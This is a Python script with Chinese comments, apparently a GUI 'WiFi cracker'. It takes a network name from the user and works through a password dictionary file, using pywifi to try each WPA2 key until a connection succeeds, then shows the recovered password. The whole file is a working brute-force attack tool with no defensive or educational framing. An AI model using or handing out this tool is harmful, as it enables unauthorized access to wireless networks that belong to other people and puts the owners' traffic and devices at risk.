# coding:utf-8

import tkinter as tk
import pywifi
from pywifi import const
import time
from tkinter.filedialog import askdirectory
from tkinter import messagebox


class WIFICracker(tk.Tk):
    def __init__(self, preWindow):
        tk.Tk.__init__(self)
        # 隐藏之前的窗口，若当前窗口被点击了 "X" 以退出当前窗口 ==》  摧毁当前窗口，显示之前的窗口
        self.preWindow = preWindow
        self.preWindow.withdraw()
        self.protocol('WM_DELETE_WINDOW', self.closeWindow)
        self.title('WIFI破解器')
        self.geometry('500x500')

        tk.Label(self, text='请输入wifi名称：').pack()
        # 输入的 wifi 名称
        self.varText = tk.StringVar()
        self.wifiNameEntry = tk.Entry(self, textvariable=self.varText)
        self.wifiNameEntry.pack()

        # 提交按钮
        tk.Button(self, text='开始破解', command=lambda: self.commit()).pack()



    # 关闭当前窗口，回复之前的窗口
    def closeWindow(self):
        self.destroy()
        self.preWindow.deiconify()

    def test_wifi_connect(self, passwordstr):
        wifi = pywifi.PyWiFi()  # 初始化
        ifaces = wifi.interfaces()[0]  # 创建取出第一个无限网卡
        # print(ifaces.name())#输出无限网卡名
        ifaces.disconnect()  # 断开无限网卡连接
        time.sleep(1)  # 断开以后缓冲2秒

        profile = pywifi.Profile()  # 配置文件
        profile.ssid = self.wifiNameEntry.get()  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 需要密码连接
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密
        profile.cipher = const.CIPHER_TYPE_CCMP  # 机密单元
        profile.key = passwordstr  # wifi密钥

        ifaces.remove_all_network_profiles()  # 删除其他所有配置文件
        tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件

        ifaces.connect(tmp_profile)  # 连接
        time.sleep(1)  # 1秒内能否连接上
        if ifaces.status() == const.IFACE_CONNECTED:
            # print("连接成功")
            return True
        else:
            # print("连接失败")
            ifaces.disconnect()  # 断开连接
            # time.sleep(1)
            return False

    # 提交按钮
    def commit(self):
        print(self.wifiNameEntry.get())
        if(len(self.wifiNameEntry.get()) == 0):
            tk.messagebox.showwarning('提交失败', 'WIFI名称不能为空！')
            return
        self.crack()

    def crack(self):
        fpath = r"wifi密码字典2.txt"
        files = open(fpath, 'r')

        # 显示进度用的
        processText = ''
        while True:  # 一行一行的输出
            fd = files.readline()
            if not fd:
                break
            fd = fd[:-1]  # 去掉换行符
            if self.test_wifi_connect(fd):
                tk.messagebox.showinfo('破解成功！', '密码是：'+fd)
                break
            else:
                print(fd, "密码错误")
        files.close()


if __name__ == '__main__':
    p = WIFICracker(tk.Tk())
    p.mainloop()

